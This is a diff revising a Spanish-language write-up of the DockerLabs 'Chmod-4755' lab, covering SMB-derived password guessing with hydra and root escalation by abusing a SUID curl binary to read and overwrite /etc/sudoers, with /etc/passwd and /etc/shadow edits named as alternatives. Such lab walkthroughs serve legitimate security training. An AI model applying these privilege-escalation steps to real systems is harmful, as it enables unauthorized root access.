@@ -4,11 +4,10 @@ summary: "Write-up del laboratorio Chmod-4755 de DockerLabs"
 author: elcybercurioso
 date: 2026-01-11
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, smb, brute force, restricted bash, suid, sudo]
 media_subpath: "/assets/img/posts/dockerlabs_chmod-4755"
 image:
   path: main.webp
-published: false
 ---
 
 ## nmap
@@ -225,7 +224,7 @@ Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 1 of 1 target completed, 0 valid password found
 ```
 
-Otra posibilidad es que la contraseña del usuario `rabol` sea el nombre de alguno de los recursos que encontramos por SMB, por lo que los añadimos al diccionario y volvemos a ejecutar **hydra**:
+Otra posibilidad es que la contraseña del usuario `rabol` sea el nombre de alguno de los recursos que encontramos por SMB, por lo que los añadimos al diccionario y volvemos a ejecutar **hydra** (que en esta ocasión confirma que se trata del nombre del recurso que vimos anteriormente por SMB):
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
@@ -311,6 +310,8 @@ find / -perm -4000 2>/dev/null
 
 Nos indican el [GTFOBins](https://gtfobins.github.io/gtfobins/curl/#suid) que el binario **/usr/bin/curl** nos permite leer y escribir ficheros cuando tiene permisos SUID, tanto de una ubicación externa como interna (empleando el wrapper `file://`), como también escribir los ficheros leídos en otra ubicación fuera de la máquina.
 
+![Desktop View](/20260112233623.webp){: width="972" height="589" .shadow}
+
 En este caso, optaremos por la solución que implica modificar el fichero `/etc/sudoers` para agregar el usuario `rabol`, y de esta manera poder ejecutar comandos como el usuario `root`. Sin embargo, otras opciones a considerar podrían ser:
 - Modificar el fichero `/etc/passwd` para agregar un nuevo usuario con permisos `root`.
 - Modificar el fichero `/etc/shadow` para indicar una nueva contraseña para el usuario `root`.
@@ -319,10 +320,6 @@ Lo primero que debemos hacer es copiar el fichero `/etc/sudoers` a una carpeta e
 
 ```bash
 $ curl file:///etc/sudoers -o /home/rabol/sudoers
-curl file:///etc/sudoers -o /home/rabol/sudoers
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  1800  100  1800    0     0  4031k      0 --:--:-- --:--:-- --:--:-- 4031k
 ```
 
 Lo siguiente es agregar una nueva línea al final del fichero, la cual indicará que el usuario `rabol` tiene permisos elevados en el sistema:
@@ -334,19 +331,13 @@ $ echo "rabol ALL=(ALL:ALL) ALL" >> sudoers
 Por último, debemos copiar la versión modificada del fichero `/etc/sudoers`, y sustituirla por la versión original en la ubicación por defecto:
 
 ```bash
-
 $ curl file:///home/rabol/sudoers -o /etc/sudoers
-curl file:///home/rabol/sudoers -o /etc/sudoers
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  1824  100  1824    0     0   326k      0 --:--:-- --:--:-- --:--:--  326k
 ```
 
 Si ahora volvemos a comprobar el contenido del fichero `/etc/sudoers`, veremos que se ha modificado exitosamente:
 
 ```bash
 $ curl file:///etc/sudoers
-curl file:///etc/sudoers
 ...
 # User privilege specification
 root    ALL=(ALL:ALL) ALL
@@ -383,7 +374,7 @@ cat /root/root.txt
 1e4e****************************
 ```
 
-Y de esta manera habremos completado el laboratorio **Chmod-4755**!
+Y de esta manera habremos completado el laboratorio `Chmod-4755`!
 
 
 
